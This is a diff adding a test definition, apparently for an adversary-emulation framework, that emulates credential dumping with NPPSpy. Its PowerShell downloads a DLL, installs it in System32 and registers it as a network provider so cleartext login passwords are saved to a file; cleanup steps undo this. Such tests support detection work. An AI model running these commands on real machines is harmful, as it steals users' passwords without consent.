@@ -65,3 +65,41 @@ atomic_tests:
       #{gsecdump_exe} -a
     name: command_prompt
     elevation_required: true
+
+- name: Credential Dumping with NPPSpy
+  description: |-
+    Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy.
+    After user's logging in cleartext password is saved in C:\NPPSpy.txt.
+    Clean up deletes the files and reverses Registry changes.
+    NPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy
+  supported_platforms:
+  - windows
+  dependency_executor_name: powershell
+  dependencies:
+  - description: NPPSpy.dll must exist in PathToAtomicsFolder\T1003\bin directory
+    prereq_command: if (Test-Path "PathToAtomicsFolder\T1003\bin\NPPSpy.dll") {exit 0} else {exit 1}
+    get_prereq_command: |-
+      $rv = mkdir PathToAtomicsFolder\T1003\bin
+      Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile "PathToAtomicsFolder\T1003\bin\NPPSpy.dll"
+  executor:
+    command: |-
+      Copy-Item "$env:Temp\NPPSPY.dll" -Destination "C:\Windows\System32"
+      $path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
+      $UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"
+      Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue
+      $rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore
+      $rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore
+      $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Class" -Value 2 -ErrorAction Ignore
+      $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Name" -Value NPPSpy -ErrorAction Ignore
+      $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\NPPSPY.dll" -ErrorAction Ignore
+      echo "[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt"
+    cleanup_command: |-
+      $cleanupPath = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
+      $cleanupUpdatedValue = $cleanupPath.PROVIDERORDER 
+      $cleanupUpdatedValue = $cleanupUpdatedValue -replace ',NPPSpy',''
+      Set-ItemProperty -Path $cleanupPath.PSPath -Name "PROVIDERORDER" -Value $cleanupUpdatedValue
+      Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy" -Recurse -ErrorAction Ignore
+      Remove-Item C:\NPPSpy.txt -ErrorAction Ignore
+      Remove-Item C:\Windows\System32\NPPSpy.dll -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
